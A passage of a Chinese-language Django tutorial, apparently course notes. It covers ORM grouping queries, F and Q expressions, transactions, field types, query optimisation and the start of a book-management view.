    <span class="hljs-comment"># res = models.Book.objects.annotate(author_num=Count(&apos;authors&apos;)).values(&apos;title&apos;,&apos;author_num&apos;)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    author_num&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x5B9A;&#x4E49;&#x7684;&#x5B57;&#x6BB5; &#x7528;&#x6765;&#x5B58;&#x50A8;&#x7EDF;&#x8BA1;&#x51FA;&#x6765;&#x7684;&#x6BCF;&#x672C;&#x4E66;&#x5BF9;&#x5E94;&#x7684;&#x4F5C;&#x8005;&#x4E2A;&#x6570;
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># res1 = models.Book.objects.annotate(author_num=Count(&apos;authors__id&apos;)).values(&apos;title&apos;,&apos;author_num&apos;)</span>
    <span class="hljs-comment"># print(res,res1)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x8865;&#x5168; &#x4E0D;&#x8981;&#x6015; &#x6B63;&#x5E38;&#x5199;
    &#x8865;&#x5168;&#x7ED9;&#x4F60;&#x662F;pycharm&#x7ED9;&#x4F60;&#x7684; &#x5230;&#x540E;&#x9762;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x76F4;&#x63A5;&#x4E66;&#x5199;&#x4EE3;&#x7801; &#x4EC0;&#x4E48;&#x8865;&#x5168;&#x90FD;&#x6CA1;&#x6709; &#x989C;&#x8272;&#x63D0;&#x793A;&#x4E5F;&#x6CA1;&#x6709;

    &quot;&quot;&quot;</span>

    <span class="hljs-comment"># 2.&#x7EDF;&#x8BA1;&#x6BCF;&#x4E2A;&#x51FA;&#x7248;&#x793E;&#x5356;&#x7684;&#x6700;&#x4FBF;&#x5B9C;&#x7684;&#x4E66;&#x7684;&#x4EF7;&#x683C;(&#x4F5C;&#x4E1A;:&#x590D;&#x4E60;&#x539F;&#x751F;SQL&#x8BED;&#x53E5; &#x5199;&#x51FA;&#x6765;)</span>
    <span class="hljs-comment"># res = models.Publish.objects.annotate(min_price=Min(&apos;book__price&apos;)).values(&apos;name&apos;,&apos;min_price&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 3.&#x7EDF;&#x8BA1;&#x4E0D;&#x6B62;&#x4E00;&#x4E2A;&#x4F5C;&#x8005;&#x7684;&#x56FE;&#x4E66;</span>
        <span class="hljs-comment"># 1.&#x5148;&#x6309;&#x7167;&#x56FE;&#x4E66;&#x5206;&#x7EC4; &#x6C42;&#x6BCF;&#x4E00;&#x672C;&#x4E66;&#x5BF9;&#x5E94;&#x7684;&#x4F5C;&#x8005;&#x4E2A;&#x6570;</span>
        <span class="hljs-comment"># 2.&#x8FC7;&#x6EE4;&#x51FA;&#x4E0D;&#x6B62;&#x4E00;&#x4E2A;&#x4F5C;&#x8005;&#x7684;&#x56FE;&#x4E66;</span>
    <span class="hljs-comment"># res = models.Book.objects.annotate(author_num=Count(&apos;authors&apos;)).filter(author_num__gt=1).values(&apos;title&apos;,&apos;author_num&apos;)</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment"># &#x53EA;&#x8981;&#x4F60;&#x7684;orm&#x8BED;&#x53E5;&#x5F97;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x8FD8;&#x662F;&#x4E00;&#x4E2A;queryset&#x5BF9;&#x8C61;</span>
    <span class="hljs-comment"># &#x90A3;&#x4E48;&#x5B83;&#x5C31;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x65E0;&#x9650;&#x5236;&#x7684;&#x70B9;queryset&#x5BF9;&#x8C61;&#x5C01;&#x88C5;&#x7684;&#x65B9;&#x6CD5;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 4.&#x67E5;&#x8BE2;&#x6BCF;&#x4E2A;&#x4F5C;&#x8005;&#x51FA;&#x7684;&#x4E66;&#x7684;&#x603B;&#x4EF7;&#x683C;</span>
    <span class="hljs-comment"># res = models.Author.objects.annotate(sum_price=Sum(&apos;book__price&apos;)).values(&apos;name&apos;,&apos;sum_price&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-string">&quot;&quot;&quot;
    &#x5982;&#x679C;&#x6211;&#x60F3;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x6BB5;&#x5206;&#x7EC4;&#x8BE5;&#x5982;&#x4F55;&#x5904;&#x7406;&#x5462;&#xFF1F;
        models.Book.objects.values(&apos;price&apos;).annotate()
    &#x540E;&#x7EED;BBS&#x4F5C;&#x4E1A;&#x4F1A;&#x4F7F;&#x7528;


    &#x4F60;&#x4EEC;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x5982;&#x679C;&#x51FA;&#x73B0;&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;
        &#x4F60;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x4E25;&#x683C;&#x6A21;&#x5F0F;
    &quot;&quot;&quot;</span>
</code></pre>
<h4 id="f&#x4E0E;q&#x67E5;&#x8BE2;">F&#x4E0E;Q&#x67E5;&#x8BE2;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># F&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 1.&#x67E5;&#x8BE2;&#x5356;&#x51FA;&#x6570;&#x5927;&#x4E8E;&#x5E93;&#x5B58;&#x6570;&#x7684;&#x4E66;&#x7C4D;</span>
    <span class="hljs-comment"># F&#x67E5;&#x8BE2;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x80FD;&#x591F;&#x5E2E;&#x52A9;&#x4F60;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x5230;&#x8868;&#x4E2D;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;
    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> F
    <span class="hljs-comment"># res = models.Book.objects.filter(maichu__gt=F(&apos;kucun&apos;))</span>
    <span class="hljs-comment"># print(res)</span>


    <span class="hljs-comment"># 2.&#x5C06;&#x6240;&#x6709;&#x4E66;&#x7C4D;&#x7684;&#x4EF7;&#x683C;&#x63D0;&#x5347;500&#x5757;</span>
    <span class="hljs-comment"># models.Book.objects.update(price=F(&apos;price&apos;) + 500)</span>


    <span class="hljs-comment"># 3.&#x5C06;&#x6240;&#x6709;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x540E;&#x9762;&#x52A0;&#x4E0A;&#x7206;&#x6B3E;&#x4E24;&#x4E2A;&#x5B57;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5728;&#x64CD;&#x4F5C;&#x5B57;&#x7B26;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019; F&#x4E0D;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x505A;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x62FC;&#x63A5;
    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">from</span> django.db.models.functions <span class="hljs-keyword">import</span> Concat
    <span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Value
    models.Book.objects.update(title=Concat(F(<span class="hljs-string">&apos;title&apos;</span>), Value(<span class="hljs-string">&apos;&#x7206;&#x6B3E;&apos;</span>)))
    <span class="hljs-comment"># models.Book.objects.update(title=F(&apos;title&apos;) + &apos;&#x7206;&#x6B3E;&apos;)  # &#x6240;&#x6709;&#x7684;&#x540D;&#x79F0;&#x4F1A;&#x5168;&#x90E8;&#x53D8;&#x6210;&#x7A7A;&#x767D;</span>
</code></pre>
<pre><code class="lang-python"> <span class="hljs-comment"># Q&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 1.&#x67E5;&#x8BE2;&#x5356;&#x51FA;&#x6570;&#x5927;&#x4E8E;100&#x6216;&#x8005;&#x4EF7;&#x683C;&#x5C0F;&#x4E8E;600&#x7684;&#x4E66;&#x7C4D;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(maichu__gt=100,price__lt=600)</span>
    <span class="hljs-string">&quot;&quot;&quot;filter&#x62EC;&#x53F7;&#x5185;&#x591A;&#x4E2A;&#x53C2;&#x6570;&#x662F;and&#x5173;&#x7CFB;&quot;&quot;&quot;</span>
    <span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Q
    <span class="hljs-comment"># res = models.Book.objects.filter(Q(maichu__gt=100),Q(price__lt=600))  # Q&#x5305;&#x88F9;&#x9017;&#x53F7;&#x5206;&#x5272; &#x8FD8;&#x662F;and&#x5173;&#x7CFB;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(Q(maichu__gt=100)|Q(price__lt=600))  # | or&#x5173;&#x7CFB;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(~Q(maichu__gt=100)|Q(price__lt=600))  # ~ not&#x5173;&#x7CFB;</span>
    <span class="hljs-comment"># print(res)  # &lt;QuerySet []&gt;</span>

    <span class="hljs-comment"># Q&#x7684;&#x9AD8;&#x9636;&#x7528;&#x6CD5;  &#x80FD;&#x591F;&#x5C06;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x7684;&#x5DE6;&#x8FB9;&#x4E5F;&#x53D8;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F62;&#x5F0F;</span>
    q = Q()
    q.connector = <span class="hljs-string">&apos;or&apos;</span>
    q.children.append((<span class="hljs-string">&apos;maichu__gt&apos;</span>,<span class="hljs-number">100</span>))
    q.children.append((<span class="hljs-string">&apos;price__lt&apos;</span>,<span class="hljs-number">600</span>))
    res = models.Book.objects.filter(q)  <span class="hljs-comment"># &#x9ED8;&#x8BA4;&#x8FD8;&#x662F;and&#x5173;&#x7CFB;</span>
    print(res)
</code></pre>
<h4 id="django&#x4E2D;&#x5982;&#x4F55;&#x5F00;&#x542F;&#x4E8B;&#x52A1;">django&#x4E2D;&#x5982;&#x4F55;&#x5F00;&#x542F;&#x4E8B;&#x52A1;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x4E8B;&#x52A1;
    ACID
        &#x539F;&#x5B50;&#x6027;
            &#x4E0D;&#x53EF;&#x5206;&#x5272;&#x7684;&#x6700;&#x5C0F;&#x5355;&#x4F4D;
        &#x4E00;&#x81F4;&#x6027;
            &#x8DDF;&#x539F;&#x5B50;&#x6027;&#x662F;&#x76F8;&#x8F85;&#x76F8;&#x6210;
        &#x9694;&#x79BB;&#x6027;
            &#x4E8B;&#x52A1;&#x4E4B;&#x95F4;&#x4E92;&#x76F8;&#x4E0D;&#x5E72;&#x6270;
        &#x6301;&#x4E45;&#x6027;
            &#x4E8B;&#x52A1;&#x4E00;&#x65E6;&#x786E;&#x8BA4;&#x6C38;&#x4E45;&#x751F;&#x6548;

    &#x4E8B;&#x52A1;&#x7684;&#x56DE;&#x6EDA; 
        rollback
    &#x4E8B;&#x52A1;&#x7684;&#x786E;&#x8BA4;
        commit
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x76EE;&#x524D;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x638C;&#x63E1;Django&#x4E2D;&#x5982;&#x4F55;&#x7B80;&#x5355;&#x7684;&#x5F00;&#x542F;&#x4E8B;&#x52A1;</span>
<span class="hljs-comment"># &#x4E8B;&#x52A1;</span>
    <span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> transaction
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> transaction.atomic():
            <span class="hljs-comment"># sql1</span>
            <span class="hljs-comment"># sql2</span>
            ...
            <span class="hljs-comment"># &#x5728;with&#x4EE3;&#x7801;&#x5FEB;&#x5185;&#x4E66;&#x5199;&#x7684;&#x6240;&#x6709;orm&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(e)
    print(<span class="hljs-string">&apos;&#x6267;&#x884C;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&apos;</span>)
</code></pre>
<h4 id="orm&#x4E2D;&#x5E38;&#x7528;&#x5B57;&#x6BB5;&#x53CA;&#x53C2;&#x6570;">orm&#x4E2D;&#x5E38;&#x7528;&#x5B57;&#x6BB5;&#x53CA;&#x53C2;&#x6570;</h4>
<pre><code class="lang-python">AutoField
    &#x4E3B;&#x952E;&#x5B57;&#x6BB5; primary_key=<span class="hljs-keyword">True</span>

CharField                varchar
    verbose_name    &#x5B57;&#x6BB5;&#x7684;&#x6CE8;&#x91CA;
  max_length        &#x957F;&#x5EA6;

IntegerField            int
BigIntegerField        bigint

DecimalField
    max_digits=<span class="hljs-number">8</span>
  decimal_places=<span class="hljs-number">2</span>

EmailFiled                varchar(<span class="hljs-number">254</span>)

DateField                    date
DateTimeField            datetime
    auto_now:&#x6BCF;&#x6B21;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x66F4;&#x65B0;&#x5F53;&#x524D;&#x65F6;&#x95F4;
  auto_now_add:&#x53EA;&#x5728;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x8BB0;&#x5F55;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x540E;&#x7EED;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x4FEE;&#x6539;&#x4E86;

BooleanField(Field)                - &#x5E03;&#x5C14;&#x503C;&#x7C7B;&#x578B;
    &#x8BE5;&#x5B57;&#x6BB5;&#x4F20;&#x5E03;&#x5C14;&#x503C;(<span class="hljs-keyword">False</span>/<span class="hljs-keyword">True</span>)     &#x6570;&#x636E;&#x5E93;&#x91CC;&#x9762;&#x5B58;<span class="hljs-number">0</span>/<span class="hljs-number">1</span>

TextField(Field)                    - &#x6587;&#x672C;&#x7C7B;&#x578B;
    &#x8BE5;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B58;&#x5927;&#x6BB5;&#x5185;&#x5BB9;(&#x6587;&#x7AE0;&#x3001;&#x535A;&#x5BA2;...)  &#x6CA1;&#x6709;&#x5B57;&#x6570;&#x9650;&#x5236;
  &#x540E;&#x9762;&#x7684;bbs&#x4F5C;&#x4E1A; &#x6587;&#x7AE0;&#x5B57;&#x6BB5;&#x7528;&#x7684;&#x5C31;&#x662F;TextField


FileField(Field)                    - &#x5B57;&#x7B26;&#x7C7B;&#x578B;
   upload_to = <span class="hljs-string">&quot;/data&quot;</span>
  &#x7ED9;&#x8BE5;&#x5B57;&#x6BB5;&#x4F20;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5BF9;&#x8C61;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5230;/data&#x76EE;&#x5F55;&#x4E0B;&#x7136;&#x540E;&#x5C06;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x4FDD;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;
  /data/a.txt
  &#x540E;&#x9762;bbs&#x4F5C;&#x4E1A;&#x4E5F;&#x4F1A;&#x6D89;&#x53CA;

<span class="hljs-comment"># &#x66F4;&#x591A;&#x5B57;&#x6BB5;</span>
&#x76F4;&#x63A5;&#x53C2;&#x8003;&#x535A;&#x5BA2;:https://www.cnblogs.com/Dominic-Ji/p/<span class="hljs-number">9203990.</span>html


<span class="hljs-comment"># django&#x9664;&#x4E86;&#x7ED9;&#x4F60;&#x63D0;&#x4F9B;&#x4E86;&#x5F88;&#x591A;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x4E4B;&#x5916; &#x8FD8;&#x652F;&#x6301;&#x4F60;&#x81EA;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyCharField</span><span class="hljs-params">(models.Field)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,max_length,*args,**kwargs)</span>:</span>
        self.max_length = max_length
        <span class="hljs-comment"># &#x8C03;&#x7528;&#x7236;&#x7C7B;&#x7684;init&#x65B9;&#x6CD5;</span>
        super().__init__(max_length=max_length,*args,**kwargs)  <span class="hljs-comment"># &#x4E00;&#x5B9A;&#x8981;&#x662F;&#x5173;&#x952E;&#x5B57;&#x7684;&#x5F62;&#x5F0F;&#x4F20;&#x5165;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">db_type</span><span class="hljs-params">(self, connection)</span>:</span>
        <span class="hljs-string">&quot;&quot;&quot;
        &#x8FD4;&#x56DE;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53CA;&#x5404;&#x79CD;&#x7EA6;&#x675F;&#x6761;&#x4EF6;
        :param connection:
        :return:
        &quot;&quot;&quot;</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;char(%s)&apos;</span>%self.max_length

<span class="hljs-comment"># &#x81EA;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x4F7F;&#x7528;</span>
myfield = MyCharField(max_length=<span class="hljs-number">16</span>,null=<span class="hljs-keyword">True</span>)



<span class="hljs-comment"># &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x53CA;&#x53C2;&#x6570;</span>
unique=<span class="hljs-keyword">True</span>
    ForeignKey(unique=<span class="hljs-keyword">True</span>)   ===            OneToOneField()
  <span class="hljs-comment"># &#x4F60;&#x5728;&#x7528;&#x524D;&#x9762;&#x5B57;&#x6BB5;&#x521B;&#x5EFA;&#x4E00;&#x5BF9;&#x4E00; orm&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x63D0;&#x793A;&#x4FE1;&#x606F; orm&#x63A8;&#x8350;&#x4F60;&#x4F7F;&#x7528;&#x540E;&#x8005;&#x4F46;&#x662F;&#x524D;&#x8005;&#x4E5F;&#x80FD;&#x7528;</span>

db_index
    &#x5982;&#x679C;db_index=<span class="hljs-keyword">True</span> &#x5219;&#x4EE3;&#x8868;&#x7740;&#x4E3A;&#x6B64;&#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x7D22;&#x5F15;
  (&#x590D;&#x4E60;&#x7D22;&#x5F15;&#x662F;&#x4EC0;&#x4E48;)

to_field
    &#x8BBE;&#x7F6E;&#x8981;&#x5173;&#x8054;&#x7684;&#x8868;&#x7684;&#x5B57;&#x6BB5;  &#x9ED8;&#x8BA4;&#x4E0D;&#x5199;&#x5173;&#x8054;&#x7684;&#x5C31;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x5F20;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;

on_delete
    &#x5F53;&#x5220;&#x9664;&#x5173;&#x8054;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5F53;&#x524D;&#x8868;&#x4E0E;&#x5176;&#x5173;&#x8054;&#x7684;&#x884C;&#x7684;&#x884C;&#x4E3A;&#x3002;
  <span class="hljs-string">&quot;&quot;&quot;
  django2.X&#x53CA;&#x4EE5;&#x4E0A;&#x7248;&#x672C; &#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x6307;&#x5B9A;&#x5916;&#x952E;&#x5B57;&#x6BB5;&#x7684;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x7EA7;&#x8054;&#x5220;&#x9664;
  &quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x4F18;&#x5316;">&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x4F18;&#x5316;</h4>
<pre><code class="lang-python">only&#x4E0E;defer    
select_related&#x4E0E;prefetch_related

<span class="hljs-string">&quot;&quot;&quot;
orm&#x8BED;&#x53E5;&#x7684;&#x7279;&#x70B9;:
    &#x60F0;&#x6027;&#x67E5;&#x8BE2;
        &#x5982;&#x679C;&#x4F60;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x4E66;&#x5199;&#x4E86;orm&#x8BED;&#x53E5; &#x5728;&#x540E;&#x9762;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x7528;&#x5230;&#x8BE5;&#x8BED;&#x53E5;&#x6240;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x53C2;&#x6570;
        &#x90A3;&#x4E48;orm&#x4F1A;&#x81EA;&#x52A8;&#x8BC6;&#x522B; &#x76F4;&#x63A5;&#x4E0D;&#x6267;&#x884C;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># only&#x4E0E;defer</span>
<span class="hljs-comment"># res = models.Book.objects.all()</span>
    <span class="hljs-comment"># print(res)  # &#x8981;&#x7528;&#x6570;&#x636E;&#x4E86;&#x624D;&#x4F1A;&#x8D70;&#x6570;&#x636E;&#x5E93;</span>

    <span class="hljs-comment"># &#x60F3;&#x8981;&#x83B7;&#x53D6;&#x4E66;&#x7C4D;&#x8868;&#x4E2D;&#x6240;&#x6709;&#x6570;&#x7684;&#x540D;&#x5B57;</span>
    <span class="hljs-comment"># res = models.Book.objects.values(&apos;title&apos;)</span>
    <span class="hljs-comment"># for d in res:</span>
    <span class="hljs-comment">#     print(d.get(&apos;title&apos;))</span>
    <span class="hljs-comment"># &#x4F60;&#x7ED9;&#x6211;&#x5B9E;&#x73B0;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BF9;&#x8C61; &#x7136;&#x540E;&#x70B9;title&#x5C31;&#x80FD;&#x591F;&#x62FF;&#x5230;&#x4E66;&#x540D; &#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;</span>
    <span class="hljs-comment"># res = models.Book.objects.only(&apos;title&apos;)</span>
    <span class="hljs-comment"># res = models.Book.objects.all()</span>
    <span class="hljs-comment"># print(res)  # &lt;QuerySet [&lt;Book: &#x4E09;&#x56FD;&#x6F14;&#x4E49;&#x7206;&#x6B3E;&gt;, &lt;Book: &#x7EA2;&#x697C;&#x68A6;&#x7206;&#x6B3E;&gt;, &lt;Book: &#x8BBA;&#x8BED;&#x7206;&#x6B3E;&gt;, &lt;Book: &#x804A;&#x658B;&#x7206;&#x6B3E;&gt;, &lt;Book: &#x8001;&#x5B50;&#x7206;&#x6B3E;&gt;]&gt;</span>
    <span class="hljs-comment"># for i in res:</span>
        <span class="hljs-comment"># print(i.title)  # &#x70B9;&#x51FB;only&#x62EC;&#x53F7;&#x5185;&#x7684;&#x5B57;&#x6BB5; &#x4E0D;&#x4F1A;&#x8D70;&#x6570;&#x636E;&#x5E93;</span>
        <span class="hljs-comment"># print(i.price)  # &#x70B9;&#x51FB;only&#x62EC;&#x53F7;&#x5185;&#x6CA1;&#x6709;&#x7684;&#x5B57;&#x6BB5; &#x4F1A;&#x91CD;&#x65B0;&#x8D70;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x800C;all&#x4E0D;&#x9700;&#x8981;&#x8D70;&#x4E86;</span>

    res = models.Book.objects.defer(<span class="hljs-string">&apos;title&apos;</span>)  <span class="hljs-comment"># &#x5BF9;&#x8C61;&#x9664;&#x4E86;&#x6CA1;&#x6709;title&#x5C5E;&#x6027;&#x4E4B;&#x5916;&#x5176;&#x4ED6;&#x7684;&#x90FD;&#x6709;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
        print(i.price)
    <span class="hljs-string">&quot;&quot;&quot;
    defer&#x4E0E;only&#x521A;&#x597D;&#x76F8;&#x53CD;
        defer&#x62EC;&#x53F7;&#x5185;&#x653E;&#x7684;&#x5B57;&#x6BB5;&#x4E0D;&#x5728;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x5BF9;&#x8C61;&#x91CC;&#x9762; &#x67E5;&#x8BE2;&#x8BE5;&#x5B57;&#x6BB5;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8D70;&#x6570;&#x636E;
        &#x800C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7684;&#x662F;&#x975E;&#x62EC;&#x53F7;&#x5185;&#x7684;&#x5B57;&#x6BB5; &#x5219;&#x4E0D;&#x9700;&#x8981;&#x8D70;&#x6570;&#x636E;&#x5E93;&#x4E86;

    &quot;&quot;&quot;</span>


<span class="hljs-comment"># select_related&#x4E0E;prefetch_related</span>
<span class="hljs-comment"># select_related&#x4E0E;prefetch_related  &#x8DDF;&#x8DE8;&#x8868;&#x64CD;&#x4F5C;&#x6709;&#x5173;</span>
    <span class="hljs-comment"># res = models.Book.objects.all()</span>
    <span class="hljs-comment"># for i in res:</span>
    <span class="hljs-comment">#     print(i.publish.name)  # &#x6BCF;&#x5FAA;&#x73AF;&#x4E00;&#x6B21;&#x5C31;&#x8981;&#x8D70;&#x4E00;&#x6B21;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;</span>

    <span class="hljs-comment"># res = models.Book.objects.select_related(&apos;authors&apos;)  # INNER JOIN</span>
    <span class="hljs-string">&quot;&quot;&quot;
    select_related&#x5185;&#x90E8;&#x76F4;&#x63A5;&#x5148;&#x5C06;book&#x4E0E;publish&#x8FDE;&#x8D77;&#x6765; &#x7136;&#x540E;&#x4E00;&#x6B21;&#x6027;&#x5C06;&#x5927;&#x8868;&#x91CC;&#x9762;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;
    &#x5168;&#x90E8;&#x5C01;&#x88C5;&#x7ED9;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x5BF9;&#x8C61;
        &#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x5BF9;&#x8C61;&#x65E0;&#x8BBA;&#x662F;&#x70B9;&#x51FB;book&#x8868;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x662F;publish&#x7684;&#x6570;&#x636E;&#x90FD;&#x65E0;&#x9700;&#x518D;&#x8D70;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x4E86;

    select_related&#x62EC;&#x53F7;&#x5185;&#x53EA;&#x80FD;&#x653E;&#x5916;&#x952E;&#x5B57;&#x6BB5;    &#x4E00;&#x5BF9;&#x591A; &#x4E00;&#x5BF9;&#x4E00;
        &#x591A;&#x5BF9;&#x591A;&#x4E5F;&#x4E0D;&#x884C;

    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># for i in res:</span>
    <span class="hljs-comment">#     print(i.publish.name)  # &#x6BCF;&#x5FAA;&#x73AF;&#x4E00;&#x6B21;&#x5C31;&#x8981;&#x8D70;&#x4E00;&#x6B21;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;</span>

    res = models.Book.objects.prefetch_related(<span class="hljs-string">&apos;publish&apos;</span>)  <span class="hljs-comment"># &#x5B50;&#x67E5;&#x8BE2;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    prefetch_related&#x8BE5;&#x65B9;&#x6CD5;&#x5185;&#x90E8;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5B50;&#x67E5;&#x8BE2;
        &#x5C06;&#x5B50;&#x67E5;&#x8BE2;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x6240;&#x6709;&#x7ED3;&#x679C;&#x4E5F;&#x7ED9;&#x4F60;&#x5C01;&#x88C5;&#x5230;&#x5BF9;&#x8C61;&#x4E2D;
        &#x7ED9;&#x4F60;&#x7684;&#x611F;&#x89C9;&#x597D;&#x50CF;&#x4E5F;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x641E;&#x5B9A;&#x7684;
    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
        print(i.publish.name)
</code></pre>
<h4 id="&#x56FE;&#x4E66;&#x7BA1;&#x7406;&#x7684;&#x56FE;&#x4E66;&#x589E;&#x5220;&#x6539;&#x67E5;">&#x56FE;&#x4E66;&#x7BA1;&#x7406;&#x7684;&#x56FE;&#x4E66;&#x589E;&#x5220;&#x6539;&#x67E5;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render,redirect,HttpResponse
<span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models
<span class="hljs-comment"># Create your views here.</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;home.html&apos;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">book_list</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-comment"># &#x5148;&#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x4E66;&#x7C4D;&#x4FE1;&#x606F; &#x4F20;&#x9012;&#x7ED9;html&#x9875;&#x9762;</span>
    book_queryset = models.Book.objects.all()
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;book_list.html&apos;</span>,locals())


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">book_add</span><span class="hljs-params">(request)</span>:</span>
